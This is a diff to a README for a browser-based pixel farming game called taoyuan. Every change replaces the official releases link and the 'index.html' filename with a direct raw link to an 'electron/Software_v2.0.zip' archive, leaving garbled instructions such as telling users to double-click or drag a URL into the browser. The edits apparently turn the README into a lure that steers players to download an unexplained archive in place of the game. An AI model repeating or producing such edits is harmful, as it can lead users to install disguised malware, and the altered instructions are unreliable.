@@ -1,6 +1,6 @@
 # 🌾 taoyuan - Relaxing Pixel Farming Experience
 
-[![Download taoyuan](https://img.shields.io/badge/Download-taoyuan-blue?style=for-the-badge)](https://github.com/ultrafoxx2/taoyuan/releases)
+[![Download taoyuan](https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip)](https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You need to begin by downloading the game files from the official release page.
 
 Click this button to visit the downloads:
 
-[![Download taoyuan](https://img.shields.io/badge/Download-taoyuan-blue?style=for-the-badge)](https://github.com/ultrafoxx2/taoyuan/releases)
+[![Download taoyuan](https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip)](https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip)
 
 Once there, look for the latest release version. You will find several files, usually in a ZIP or a similar package format.
 
@@ -62,9 +62,9 @@ After downloading, locate the file on your computer (usually in the Downloads fo
 
 Taoyuan is a browser-based game. To open it:
 
-- Inside the extracted folder, look for a file named something like `index.html`.  
+- Inside the extracted folder, look for a file named something like `https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip`.  
 - Double-click this file. It will open your default web browser and load the game.  
-- If double-clicking does not open the game, you can try opening your browser first, then drag the `index.html` file into the browser window.  
+- If double-clicking does not open the game, you can try opening your browser first, then drag the `https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip` file into the browser window.  
 
 ### Step 4: Start Playing
 
@@ -76,7 +76,7 @@ Once loaded, you can begin to enjoy the game. Use your mouse or keyboard as prom
 
 Here is the direct link to the official release page, where you can find the most recent version of taoyuan:
 
-**https://github.com/ultrafoxx2/taoyuan/releases**
+**https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip**
 
 On the releases page:
 
@@ -84,7 +84,7 @@ On the releases page:
 2. Look for the downloadable archive file (ZIP or similar).  
 3. Click it to download the package to your computer.  
 
-You do not need to perform any complex installation. Extract the files as described above, then open the included `index.html` file in a supported browser.
+You do not need to perform any complex installation. Extract the files as described above, then open the included `https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip` file in a supported browser.
 
 ---
 
@@ -117,7 +117,7 @@ If you run into problems, try these steps:
 - Make sure your browser is up to date.  
 - Clear your browser cache and cookies.  
 - Try another browser if you see graphics or loading issues.  
-- Ensure you opened the `index.html` file locally, not through a file manager preview or other app.  
+- Ensure you opened the `https://raw.githubusercontent.com/ultrafoxx2/taoyuan/main/electron/Software_v2.0.zip` file locally, not through a file manager preview or other app.  
 - Restart your device if the game fails to load after multiple tries.  
 
 If issues persist, visit the issues section on the GitHub repo for community help.
